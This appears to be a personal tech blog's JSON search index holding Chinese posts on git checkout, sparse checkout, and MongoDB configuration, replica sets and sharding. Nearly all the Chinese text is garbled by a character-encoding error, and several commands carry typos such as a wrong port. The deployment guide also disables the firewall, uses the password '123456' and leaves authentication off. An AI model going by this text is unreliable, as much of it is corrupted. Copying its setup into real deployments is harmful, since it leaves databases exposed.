ä¸ºé¿å…è·¯å¾„å’Œå¼•ç”¨ï¼ˆæˆ–æäº¤IDï¼‰åŒåè€Œå‘ç”Ÿå†²çªï¼Œå¯ä»¥åœ¨å‰ç”¨â€“ä½œä¸ºåˆ†éš”æ­¤ç”¨æ³•ä¸ä¼šæ”¹å˜HEADå¤´æŒ‡é’ˆï¼Œä¸»è¦ç”¨äºæŒ‡å®šç‰ˆæœ¬çš„æ–‡ä»¶è¦†ç›–å·¥ä½œåŒºä¸­å¯¹åº”çš„æ–‡ä»¶ã€‚è‹¥çœç•¥ï¼Œåˆ™ä¼šç”¨æš‚å­˜åŒºçš„æ–‡ä»¶è¦†ç›–å·¥ä½œåŒºçš„æ–‡ä»¶ï¼Œå¦åˆ™ç”¨æŒ‡å®šæäº¤ä¸­çš„æ–‡ä»¶è¦†ç›–æš‚å­˜åŒºå’Œå·¥ä½œåŒºä¸­å¯¹åº”çš„æ–‡ä»¶ã€‚ç”¨æ³•äºŒï¼šgit checkoutæ­¤ç”¨æ³•ä¼šæ”¹å˜HEADå¤´æŒ‡é’ˆï¼Œä¹‹æ‰€ä»¥åé¢çš„å‚æ•°å†™ä½œï¼Œæ˜¯å› ä¸ºåªæœ‰HEADåˆ‡æ¢åˆ°ä¸€ä¸ªåˆ†æ”¯æ‰å¯ä»¥å¯¹æäº¤è¿›è¡Œè·Ÿè¸ªï¼Œå¦åˆ™ä»ç„¶ä¼šè¿›å…¥â€œåˆ†ç¦»å¤´æŒ‡é’ˆâ€çš„çŠ¶æ€ï¼Œæ­¤çŠ¶æ€ä¸‹æäº¤ä¸èƒ½è¢«å¼•ç”¨å…³è”åˆ°ï¼Œä»è€Œå¯èƒ½ä¸¢å¤±ã€‚æ‰€ä»¥æ­¤ç”¨æ³•æœ€ä¸»è¦çš„ä½œç”¨å°±æ˜¯åˆ‡æ¢åˆ°åˆ†æ”¯ï¼Œè‹¥çœç•¥åˆ™ç›¸å½“äºå¯¹å·¥ä½œåŒºè¿›è¡ŒçŠ¶æ€æ£€æŸ¥ã€‚ç”¨æ³•ä¸‰ï¼šgit checkout [ &lt;new_branch&gt;]æ­¤ç”¨æ³•ä¸»è¦æ˜¯åˆ›å»ºå’Œåˆ‡æ¢åˆ°æ–°çš„åˆ†æ”¯ï¼Œæ–°çš„åˆ†æ”¯ä»&lt;start_point&gt;æŒ‡å®šçš„æäº¤å¼€å§‹åˆ›å»ºã€‚æ–°åˆ†æ”¯ä¸masteråˆ†æ”¯æ²¡ä»€ä¹ˆå®è´¨çš„ä¸åŒï¼Œéƒ½æ˜¯åœ¨refs/headså‘½åç©ºé—´ä¸‹çš„å¼•ç”¨ã€‚$ git checkout branchæ£€å‡ºbranchåˆ†æ”¯ï¼Œæ›´æ–°HEADä»¥æŒ‡å‘branchåˆ†æ”¯ï¼Œä»¥åŠç”¨branchæŒ‡å‘çš„æ ‘æ›´æ–°æš‚å­˜åŒºå’Œå·¥ä½œåŒºã€‚$ git checkout ã€ $ git checkout HEADæ±‡æ€»æ˜¾ç¤ºå·¥ä½œåŒºã€æš‚å­˜åŒºä¸HEADçš„å·®å¼‚$ git checkout â€“ filenameç”¨æš‚å­˜åŒºä¸­filenameæ–‡ä»¶è¦†ç›–å·¥ä½œåŒºä¸­çš„filenameæ–‡ä»¶ï¼Œç›¸å½“äºå–æ¶ˆè‡ªä¸Šæ¬¡æ‰§è¡Œgit add filenameä»¥æ¥ï¼ˆå¦‚æœæ‰§è¡Œè¿‡ï¼‰çš„æœ¬åœ°ä¿®æ”¹ï¼ˆä¼šæ‚„æ— å£°æ¯è¦†ç›–ï¼‰$ git checkout branch â€“ filenameç»´æŒHEADçš„æŒ‡å‘ä¸å˜ï¼Œç”¨branchæ‰€æŒ‡å‘çš„æäº¤ä¸­çš„filenameæ›¿æ¢æš‚å­˜åŒºå’Œå·¥ä½œåŒºä¸­ç›¸åº”çš„æ–‡ä»¶ï¼Œä¼šå°†æš‚å­˜åŒºå’Œå·¥ä½œåŒºä¸­çš„filenameæ–‡ä»¶ç›´æ¥è¦†ç›–$ git checkout â€“ æˆ– $ git checkout .å–æ¶ˆæ‰€æœ‰æœ¬åœ°çš„ä¿®æ”¹ï¼ˆç›¸å¯¹äºæš‚å­˜åŒºï¼‰ï¼Œç›¸å½“äºç”¨æš‚å­˜åŒºçš„æ‰€æœ‰æ–‡ä»¶ç›´æ¥è¦†ç›–æœ¬åœ°æ–‡ä»¶ï¼Œä¸ç»™ç”¨æˆ·ä»»ä½•ç¡®è®¤æœºä¼šã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"git æ£€å‡ºå•ä¸ªæ–‡ä»¶çš„æ–¹æ³•","slug":"history/tech/5953c4d0c2b92f5665eed9de","date":"2016-01-02T03:40:43.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9de/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9de/","excerpt":"","text":"æ‘˜è‡ªstackoverflowhttp://stackoverflow.com/questions/600079/is-there-any-way-to-clone-a-git-repositorys-sub-directory-only/13738951#13738951What you are trying to do is called a sparse checkout, and that feature was added in git 1.7.0 (Feb. 2012). The steps to do a sparse clone are as follows:mkdircdgit initgit remote add -f originThis creates an empty repository with your remote, and fetches all objects but doesnâ€™t check them out. Then do:git config core.sparseCheckout trueNow you need to define which files/folders you want to actually check out. This is done by listing them in .git/info/sparse-checkout, eg:echo â€œsome/dir/â€ &gt;&gt; .git/info/sparse-checkoutecho â€œanother/sub/treeâ€ &gt;&gt; .git/info/sparse-checkoutLast but not least, update your empty repo with the state from the remote:git pull origin masterYou might want to have a look at the extended tutorial and you should probably read the officialdocumentation for sparse checkout.","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"mongodb   é…ç½®æ–‡ä»¶","slug":"history/tech/5953c4d0c2b92f5665eed9dc","date":"2016-01-02T01:59:21.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9dc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9dc/","excerpt":"","text":"systemLog:destination : filepath : /var/log/mongodb/mongod.loglogAppend : truestorage:journal:enabled: trueengine: wiredTigerdbPath: /data/mongodb/data/db/directoryPerDB: truewiredTiger:engineConfig:directoryForIndexes: truecollectionConfig:blockCompressor: zlibindexConfig:prefixCompression: trueprocessManagement:fork: truenet:bindIp: 192.168.1.111port: 11111security:authorization: enabled","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"mongodb ç®€å•éƒ¨ç½²æ–¹æ¡ˆåŠå®ä¾‹","slug":"history/tech/5953c4d0c2b92f5665eed9dd","date":"2016-01-02T00:01:04.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9dd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9dd/","excerpt":"","text":"ç¬¬ä¸€èŠ‚ å‡†å¤‡å·¥ä½œä¸€ å®‰è£…mongodbæˆ‘è¿™é‡Œé€‰ç”¨rehl 5.6ä½œä¸ºå…¶è¿è¡Œè½½ä½“ã€‚ä¸‹è½½mongodbçš„linuxç‰ˆæœ¬(æ³¨æ„32ä½å’Œ64ä½çš„åŒºåˆ«)ï¼Œä¸‹è½½åœ°å€ï¼šhttp://www.mongodb.org/downloads wget http://fastdl.mongodb.org/linux/mongodb-linux-x86_64-2.0.4.tgzå°†ä¸‹è½½çš„mongodbå®‰è£…æ–‡ä»¶ mongodb-linux-x86_64-2.0.4.tgz æ”¾åˆ°/usr/local/ä¸‹è§£å‹ tar -zxvf mongodb-linux-x86_64-2.0.4.tgzé‡å‘½å mv mongodb-linux-x86_64-2.0.4 /usr/local/mongodbåˆ›å»ºæ•°æ®åº“æ–‡ä»¶ç›®å½•ï¼Œ # mkdir -p /data/mongodb,æˆ‘æŠŠæ•°æ®åº“æ–‡ä»¶ç›®å½•æ”¾åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ï¼Œ# mkdir -p data/db,åˆ›å»ºæ—¥å¿—ç›®å½• #mkdir -p logäºŒ å¯åŠ¨é¦–å…ˆç”¨å‘½ä»¤è¿›å…¥åˆ°binç›®å½•ä¸‹ï¼šcd /usr/local/mongodb/binæ–¹å¼ä¸€ï¼šç›´æ¥è¿è¡Œå‘½ä»¤å¯åŠ¨./mongod â€“port 10000 â€“fork â€“logpath= logpath=/data/mongodb/log/mongodb.log â€“ logappend â€“ dbpath=/data/mongodb/data/dbæ–¹å¼äºŒï¼šé€šè¿‡é…ç½®æ–‡ä»¶æ–¹å¼å¯åŠ¨ï¼ˆæ¨èï¼‰ã€‚1.åœ¨æœåŠ¡å™¨ä¸Šæ–°å»ºmongodb.confé…ç½®æ–‡ä»¶(å»ºè®®ç”¨å‘½ä»¤ç”Ÿæˆï¼Œæ”¾åœ¨mongodbåŒä¸€ä¸ªç›®å½•ä¸‹)å†…å®¹ä¸ºï¼šport=10000 #ç«¯å£å·fork=true #ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œï¼Œåˆ›å»ºæœåŠ¡å™¨è¿›ç¨‹#master=true #å•ä¸»ä»é…ç½®æ—¶è®¾ä¸ºä¸»æœåŠ¡å™¨#salve=true ##å•ä¸»ä»é…ç½®æ—¶è®¾ä¸ºä»æœåŠ¡å™¨logpath=/data/mongodb/log/mongodb.log #æ—¥å¿—è¾“å‡ºæ–‡ä»¶è·¯å¾„logappend=true #æ—¥å¿—è¾“å‡ºæ–¹å¼dbpath=/data/mongodb/data/db #æ•°æ®åº“è·¯å¾„replSet=blort #è®¾ç½®å¯Œæœ¬é›†çš„åå­—shardsvr=true #è®¾ç½®æ˜¯å¦åˆ†ç‰‡2.è¿è¡Œ./mongod â€“config ~/.mongodb.conf å‘½ä»¤(â€“configå¯ä»¥ç›´æ¥å†™æˆ-f)ã€‚è¾“å‡º:all output going to: /data/mongodb/log/mongodb.logforked process: 5315mongodb å¯åŠ¨å‚æ•°â€“quiet # å®‰é™è¾“å‡ºâ€“port arg # æŒ‡å®šæœåŠ¡ç«¯å£å·ï¼Œé»˜è®¤ç«¯å£27017â€“bind_ip arg # ç»‘å®šæœåŠ¡IPï¼Œè‹¥ç»‘å®š127.0.0.1ï¼Œåˆ™åªèƒ½æœ¬æœºè®¿é—®ï¼Œä¸æŒ‡å®šé»˜è®¤æœ¬åœ°æ‰€æœ‰IPâ€“logpath arg # æŒ‡å®šMongoDBæ—¥å¿—æ–‡ä»¶ï¼Œæ³¨æ„æ˜¯æŒ‡å®šæ–‡ä»¶ä¸æ˜¯ç›®å½•â€“logappend # ä½¿ç”¨è¿½åŠ çš„æ–¹å¼å†™æ—¥å¿—â€“pidfilepath arg # PID File çš„å®Œæ•´è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œåˆ™æ²¡æœ‰PIDæ–‡ä»¶â€“keyFile arg # é›†ç¾¤çš„ç§é’¥çš„å®Œæ•´è·¯å¾„ï¼Œåªå¯¹äºReplica Set æ¶æ„æœ‰æ•ˆâ€“unixSocketPrefix arg # UNIXåŸŸå¥—æ¥å­—æ›¿ä»£ç›®å½•,(é»˜è®¤ä¸º /tmp)â€“fork # ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡ŒMongoDBï¼Œåˆ›å»ºæœåŠ¡å™¨è¿›ç¨‹â€“auth # å¯ç”¨éªŒè¯â€“cpu # å®šæœŸæ˜¾ç¤ºCPUçš„CPUåˆ©ç”¨ç‡å’Œiowaitâ€“dbpath arg # æŒ‡å®šæ•°æ®åº“è·¯å¾„â€“diaglog arg # diaglogé€‰é¡¹ 0=off 1=W 2=R 3=both 7=W+some readsâ€“directoryperdb # è®¾ç½®æ¯ä¸ªæ•°æ®åº“å°†è¢«ä¿å­˜åœ¨ä¸€ä¸ªå•ç‹¬çš„ç›®å½•â€“journal # å¯ç”¨æ—¥å¿—é€‰é¡¹ï¼ŒMongoDBçš„æ•°æ®æ“ä½œå°†ä¼šå†™å…¥åˆ°journalæ–‡ä»¶å¤¹çš„æ–‡ä»¶é‡Œâ€“journalOptions arg # å¯ç”¨æ—¥å¿—è¯Šæ–­é€‰é¡¹â€“ipv6 # å¯ç”¨IPv6é€‰é¡¹â€“jsonp # å…è®¸JSONPå½¢å¼é€šè¿‡HTTPè®¿é—®ï¼ˆæœ‰å®‰å…¨å½±å“ï¼‰â€“maxConns arg # æœ€å¤§åŒæ—¶è¿æ¥æ•° é»˜è®¤2000â€“noauth # ä¸å¯ç”¨éªŒè¯â€“nohttpinterface # å…³é—­httpæ¥å£ï¼Œé»˜è®¤å…³é—­27018ç«¯å£è®¿é—®â€“noprealloc # ç¦ç”¨æ•°æ®æ–‡ä»¶é¢„åˆ†é…(å¾€å¾€å½±å“æ€§èƒ½)â€“noscripting # ç¦ç”¨è„šæœ¬å¼•æ“â€“notablescan # ä¸å…è®¸è¡¨æ‰«æâ€“nounixsocket # ç¦ç”¨Unixå¥—æ¥å­—ç›‘å¬â€“nssize arg (=16) # è®¾ç½®ä¿¡æ•°æ®åº“.nsæ–‡ä»¶å¤§å°(MB)â€“objcheck # åœ¨æ”¶åˆ°å®¢æˆ·æ•°æ®,æ£€æŸ¥çš„æœ‰æ•ˆæ€§ï¼Œâ€“profile arg # æ¡£æ¡ˆå‚æ•° 0=off 1=slow, 2=allâ€“quota # é™åˆ¶æ¯ä¸ªæ•°æ®åº“çš„æ–‡ä»¶æ•°ï¼Œè®¾ç½®é»˜è®¤ä¸º8â€“quotaFiles arg # number of files allower per db, requires --quotaâ€“rest # å¼€å¯ç®€å•çš„rest APIâ€“repair # ä¿®å¤æ‰€æœ‰æ•°æ®åº“run repair on all dbsâ€“repairpath arg # ä¿®å¤åº“ç”Ÿæˆçš„æ–‡ä»¶çš„ç›®å½•,é»˜è®¤ä¸ºç›®å½•åç§°dbpathâ€“slowms arg (=100) # value of slow for profile and console logâ€“smallfiles # ä½¿ç”¨è¾ƒå°çš„é»˜è®¤æ–‡ä»¶â€“syncdelay arg (=60) # æ•°æ®å†™å…¥ç£ç›˜çš„æ—¶é—´ç§’æ•°(0=never,ä¸æ¨è)â€“sysinfo # æ‰“å°ä¸€äº›è¯Šæ–­ç³»ç»Ÿä¿¡æ¯â€“upgrade # å¦‚æœéœ€è¦å‡çº§æ•°æ®åº“* Replicaton å‚æ•° --fastsync # ä»ä¸€ä¸ªdbpathé‡Œå¯ç”¨ä»åº“å¤åˆ¶æœåŠ¡ï¼Œè¯¥dbpathçš„æ•°æ®åº“æ˜¯ä¸»åº“çš„å¿«ç…§ï¼Œå¯ç”¨äºå¿«é€Ÿå¯ç”¨åŒæ­¥ --autoresync # å¦‚æœä»åº“ä¸ä¸»åº“åŒæ­¥æ•°æ®å·®å¾—å¤šï¼Œè‡ªåŠ¨é‡æ–°åŒæ­¥ï¼Œ --oplogSize arg # è®¾ç½®oplogçš„å¤§å°(MB) * ä¸»/ä»å‚æ•° --master # ä¸»åº“æ¨¡å¼ --slave # ä»åº“æ¨¡å¼ --source arg # ä»åº“ ç«¯å£å· --only arg # æŒ‡å®šå•ä¸€çš„æ•°æ®åº“å¤åˆ¶ --slavedelay arg # è®¾ç½®ä»åº“åŒæ­¥ä¸»åº“çš„å»¶è¿Ÿæ—¶é—´ * Replica set(å‰¯æœ¬é›†)é€‰é¡¹ï¼š --replSet arg # è®¾ç½®å‰¯æœ¬é›†åç§° * Sharding(åˆ†ç‰‡)é€‰é¡¹ --configsvr # å£°æ˜è¿™æ˜¯ä¸€ä¸ªé›†ç¾¤çš„configæœåŠ¡,é»˜è®¤ç«¯å£27019ï¼Œé»˜è®¤ç›®å½•/data/configdb --shardsvr # å£°æ˜è¿™æ˜¯ä¸€ä¸ªé›†ç¾¤çš„åˆ†ç‰‡,é»˜è®¤ç«¯å£27018 --noMoveParanoia # å…³é—­åæ‰§ä¸ºmoveChunkæ•°æ®ä¿å­˜? ä¸‰ æŸ¥è¯¢è¿›ç¨‹å’Œå…³é—­æ•°æ®åº“è¿è¡Œ ps -ef|grep mongo å‘½ä»¤æŸ¥è¯¢æœåŠ¡å™¨è¿›ç¨‹è¿è¡Œ kill -2 5315å‘½ä»¤killæ‰5315çš„è¿›ç¨‹å›› è¿›å…¥æ•°æ®åº“å¹¶ç®€å•æ“ä½œæ•°æ®åº“1.è¿è¡Œ./mongo â€“port 1000è¿›å…¥åˆšåˆšå¯åŠ¨çš„ç«¯å£å·ä¸º10000çš„æ•°æ®åº“2.ä½¿ç”¨use testå¯ä»¥åˆ‡æ¢é›†åˆï¼ˆç›¸å½“äºæ•°æ®åº“è¡¨ï¼‰,è¿™é‡Œåˆ‡æ¢åˆ°äº†testé›†åˆ3.ä½¿ç”¨db.test.insert(â€œaâ€,â€œbâ€);å‘é›†åˆæ’å…¥æ•°æ®4.ä½¿ç”¨db.test.find();æŸ¥è¯¢é›†åˆé‡Œçš„æ•°æ®5.æ›´å¤šshellå‘½ä»¤è¯·æŸ¥é˜…ç›¸å…³æ–‡æ¡£äº” æ³¨æ„äº‹é¡¹é˜²ç«å¢™è®¾ç½®ï¼ˆæµ‹è¯•æ—¶å¯ç›´æ¥å…³é—­linuxå…³é—­é˜²ç«å¢™ï¼šç«‹å³ä½†ä¸æ°¸ä¹…ç”Ÿæ•ˆï¼šservice iptables stopé‡å¯æ°¸ä¹…ç”Ÿæ•ˆï¼šchkconfig iptables offï¼‰ç¬¬äºŒèŠ‚ å‰¯æœ¬é›†ç®€å•çš„è¯´ï¼Œå‰¯æœ¬é›†å°±æ˜¯æœ‰è‡ªåŠ¨æ•…éšœæ¢å¤åŠŸèƒ½çš„ä¸»ä»é›†ç¾¤ï¼Œå‰¯æœ¬é›†æ²¡æœ‰å›ºå®šçš„&quot;ä¸»èŠ‚ç‚¹&quot;ï¼Œé›†ç¾¤ä¼šé€šè¿‡æŠ•ç¥¨é€‰ä¸¾ä¸€ä¸ª&quot;ä¸»èŠ‚ç‚¹&quot;ã€‚å½“ä¸»èŠ‚ç‚¹å²©æœºæ—¶ï¼Œä¼šå˜æ›´åˆ°å…¶ä»–èŠ‚ç‚¹ã€‚å‰¯æœ¬é›†å¸ƒåœ¨ä¸åŒæœºå™¨ä¸Šæ—¶ï¼Œè‡³å°‘è¦å¯åŠ¨ä¸‰ä¸ªï¼ˆå•æ•°ï¼‰æ•°æ®åº“æœåŠ¡å™¨è¿›ç¨‹ï¼Œå¦åˆ™å¯åŠ¨æ—¶æŠ•ç¥¨ä¸æˆåŠŸä¼šä¸€ç›´åˆå§‹åŒ–ä¸äº†ã€‚ä¸€ ä»¥é…ç½®æ–‡ä»¶æ–¹å¼å¯åŠ¨ä¸‰å°æœºå™¨ä¸Šçš„æ•°æ®åº“æœåŠ¡å™¨ä¸‰å°æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼šport=10000 #ç«¯å£å·fork=true #ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œï¼Œåˆ›å»ºæœåŠ¡å™¨è¿›ç¨‹logpath=/data/mongodb/log/mongodb.log #æ—¥å¿—è¾“å‡ºæ–‡ä»¶è·¯å¾„logappend=true #æ—¥å¿—è¾“å‡ºæ–¹å¼dbpath=/data/mongodb/data/db #æ•°æ®åº“è·¯å¾„replSet=blort #è®¾ç½®å¯Œæœ¬é›†çš„åå­—ä¸ºblort,replSetæ˜¯è®©æœåŠ¡å™¨çŸ¥é“åœ¨è¿™ä¸ª&quot;blort&quot;å‰¯æœ¬é›†ä¸­è¿˜æœ‰åˆ«çš„æœºå™¨ replSet=blort /10.10.112.181:10000, 10.10.112.191:10000#è®¾ç½®å¯Œæœ¬é›†çš„åå­—,è¿™ç§æ–¹å¼ä¹Ÿå¯ä»¥ï¼Œæ„æ€å°±æ˜¯&quot;blort&quot;å‰¯æœ¬é›†å…¶ä»–æœºå™¨ï¼Œä½ç½®åœ¨10.10.112.181:10000å’Œ10.10.112.191:10000ï¼Œä½†ä¸æ¨èé€šå‘½ä»¤å¯åŠ¨ä¸‰å°æ•°æ®åº“æœåŠ¡å™¨/usr/local/mongodb/bin/mongod -f /data/mongodb/blort/config.conf/usr/local/mongodb/bin/mongod -f /data/mongodb/blort2/config.conf/usr/local/mongodb/bin/mongod -f /data/mongodb/blort3/config.confäºŒ åˆå§‹åŒ–å‰¯æœ¬é›†ï¼ˆåªèƒ½åˆå§‹åŒ–ä¸€æ¬¡ï¼‰/usr/local/mongodb/bin/mongo --port 30001use adminæ–¹æ³•ä¸€ï¼šdb.runCommand({â€œreplSetInitiateâ€:{&quot;_id&quot;:â€œblortâ€,â€œmembersâ€:}})æ–¹æ³•äºŒï¼šconfig={_id:â€˜blortâ€™,members:};rs.initiate(config);ä¸‰ å¢åŠ å’Œè®¾ç½®å‰¯æœ¬é›†æœ‰å‡ ç§ä¸åŒç±»å‹çš„èŠ‚ç‚¹å¯ä»¥å­˜åœ¨äºå‰¯æœ¬é›†ï¼šStandard ï¼šå­˜åœ¨äºå‰¯æœ¬ï¼Œå‚ä¸æŠ•ç¥¨ï¼Œæœ‰å¯èƒ½æˆä¸ºæ´»è·ƒèŠ‚ç‚¹ï¼ˆå³ä¸»èŠ‚ç‚¹ï¼‰Passive :å­˜å‚¨äº†å®Œæ•´çš„æ•°æ®å‰¯æœ¬ï¼Œå‚ä¸æŠ•ç¥¨ï¼Œä¸èƒ½æˆä¸ºæ´»è·ƒèŠ‚ç‚¹Arbiter:ä»²è£è€…ï¼Œåªå‚ä¸æŠ•ç¥¨ï¼Œä¸èƒ½æˆä¸ºæ´»è·ƒèŠ‚ç‚¹Priorityï¼šä¼˜å…ˆçº§ï¼Œï¼ˆæŠ•ç¥¨ä¼šæŠ•ä¼˜å…ˆçº§é«˜çš„ï¼Œå¦‚æœç›¸åŒï¼Œåˆ™æŠ•æ•°æ®æœ€æ–°çš„ï¼‰ä»¥ä¸Šç±»å‹å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯¹å‰¯æœ¬é›†åˆè¿›è¡Œä¿®æ”¹æˆ–è€…å¢åŠ æœåŠ¡å™¨db.runCommand({â€œreplSetReconfigâ€:{&quot;_id&quot;:â€œtest3â€,â€œversionâ€:2,â€œmembersâ€:}})å¢åŠ å‰¯æœ¬æœåŠ¡å™¨åœ¨å¢åŠ ä¸€ä¸ªä»æœåŠ¡å™¨èŠ‚ç‚¹aï¼ä»¥ç›¸åŒå‰¯æœ¬é›†åå­—å¯åŠ¨ä¸€å°æœåŠ¡å™¨b.é€šè¿‡rs.addå‘½ä»¤å¾€system.replsetæ·»åŠ æ–°çš„ä»æœåŠ¡å™¨æˆå‘˜rs.add(â€œ10.10.113.122:30005â€); æˆ–è€…rs.add({&quot;_id&quot;:4,â€œhostâ€:â€œ10.10.113.122:30005â€})æ·»åŠ ä»²è£rs.addArb(â€œ10.10.113.122:30004â€);å›› è¯»æ‰©å±•å¾…ç ”ç©¶äº” ç”¨æˆ·æ ¡éªŒæœªæˆåŠŸuse test;db.addUser(â€œtestâ€,â€œ123456â€);db.auth(â€œtestâ€,â€œ123456â€);db.system.users.find();db.system.users.remove(â€œtestâ€,â€œ123456â€);ç¬¬äºŒèŠ‚ replica sets + shard (åŒæœºæ–¹æ¡ˆï¼Œå•æœºæ¨¡æ‹Ÿ)ä¸€ å‡†å¤‡mkdir -p /data/mongodb/shard1-1/db/mkdir -p /data/mongodb/shard1-1/log//data/mongodb/shard1-1/config.confport=30001 #ç«¯å£å·fork=true #ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œï¼Œåˆ›å»ºæœåŠ¡å™¨è¿›ç¨‹#nohttpinterface=true # å…³é—­httpæ¥å£ï¼Œé»˜è®¤å…³é—­27018ç«¯å£è®¿é—® port + 1000rest = true #httpæ¥å£ å¯åŠ¨rest ä½¿èƒ½è®¿é—® ã€‚ä¸nohttpinterface å¯¹åº” åªå¼€ä¸€ä¸ªshardsvr=true #å¯åŠ¨åˆ†ç‰‡#oplogSize=100 #å¤åˆ¶æ—¥å¿—å¤§å° MBlogpath=/data/mongodb/shard1-1/log/shard1-1.log #æ—¥å¿—è¾“å‡ºæ–‡ä»¶è·¯å¾„logappend=true #æ—¥å¿—è¾“å‡ºæ–¹å¼dbpath=/data/mongodb/shard1-1/db #æ•°æ®åº“è·¯å¾„directoryperdb=true # è®¾ç½®æ¯ä¸ªæ•°æ®åº“å°†è¢«ä¿å­˜åœ¨ä¸€ä¸ªå•ç‹¬çš„ç›®å½•replSet=shard1 #è®¾ç½®å¯Œæœ¬é›†çš„åå­—ä¸ºshard1,replSetæ˜¯è®©æœåŠ¡å™¨çŸ¥é“åœ¨è¿™ä¸ª&quot;shard1&quot;å‰¯æœ¬é›†ä¸­è¿˜æœ‰åˆ«çš„æœºå™¨#auth=true # å¯ç”¨éªŒè¯mkdir -p /data/mongodb/shard1-1a/db/mkdir -p /data/mongodb/shard1-1a/log//data/mongodb/shard1-1a/config.confport=30002 #ç«¯å£å·fork=true #ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œï¼Œåˆ›å»ºæœåŠ¡å™¨è¿›ç¨‹#nohttpinterface=true # å…³é—­httpæ¥å£ï¼Œé»˜è®¤å…³é—­27018ç«¯å£è®¿é—® port + 1000rest = true #httpæ¥å£ å¯åŠ¨rest ä½¿èƒ½è®¿é—® ã€‚ä¸nohttpinterface å¯¹åº” åªå¼€ä¸€ä¸ªshardsvr=true #å¯åŠ¨åˆ†ç‰‡#oplogSize=100 #å¤åˆ¶æ—¥å¿—å¤§å° MBlogpath=/data/mongodb/shard1-1a/log/shard1-1a.log #æ—¥å¿—è¾“å‡ºæ–‡ä»¶è·¯å¾„logappend=true #æ—¥å¿—è¾“å‡ºæ–¹å¼dbpath=/data/mongodb/shard1-1a/db #æ•°æ®åº“è·¯å¾„directoryperdb=true # è®¾ç½®æ¯ä¸ªæ•°æ®åº“å°†è¢«ä¿å­˜åœ¨ä¸€ä¸ªå•ç‹¬çš„ç›®å½•replSet=shard1 #è®¾ç½®å¯Œæœ¬é›†çš„åå­—ä¸ºshard1,replSetæ˜¯è®©æœåŠ¡å™¨çŸ¥é“åœ¨è¿™ä¸ª&quot;shard1&quot;å‰¯æœ¬é›†ä¸­è¿˜æœ‰åˆ«çš„æœºå™¨#auth=true # å¯ç”¨éªŒè¯mkdir -p /data/mongodb/shard1-2/db/mkdir -p /data/mongodb/shard1-2/log//data/mongodb/shard1-2/config.confport=30003 #ç«¯å£å·fork=true #ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œï¼Œåˆ›å»ºæœåŠ¡å™¨è¿›ç¨‹#nohttpinterface=true # å…³é—­httpæ¥å£ï¼Œé»˜è®¤å…³é—­27018ç«¯å£è®¿é—® port + 1000rest = true #httpæ¥å£ å¯åŠ¨rest ä½¿èƒ½è®¿é—® ã€‚ä¸nohttpinterface å¯¹åº” åªå¼€ä¸€ä¸ªshardsvr=true #å¯åŠ¨åˆ†ç‰‡#oplogSize=100 #å¤åˆ¶æ—¥å¿—å¤§å° MBlogpath=/data/mongodb/shard1-2/log/shard1-2.log #æ—¥å¿—è¾“å‡ºæ–‡ä»¶è·¯å¾„logappend=true #æ—¥å¿—è¾“å‡ºæ–¹å¼dbpath=/data/mongodb/shard1-2/db #æ•°æ®åº“è·¯å¾„directoryperdb=true # è®¾ç½®æ¯ä¸ªæ•°æ®åº“å°†è¢«ä¿å­˜åœ¨ä¸€ä¸ªå•ç‹¬çš„ç›®å½•replSet=shard1 #è®¾ç½®å¯Œæœ¬é›†çš„åå­—ä¸ºshard1,replSetæ˜¯è®©æœåŠ¡å™¨çŸ¥é“åœ¨è¿™ä¸ª&quot;shard1&quot;å‰¯æœ¬é›†ä¸­è¿˜æœ‰åˆ«çš„æœºå™¨#auth=true # å¯ç”¨éªŒè¯mkdir -p /data/mongodb/shard2-1/db/mkdir -p /data/mongodb/shard2-1/log//data/mongodb/shard2-1/config.confport=32001 #ç«¯å£å·fork=true 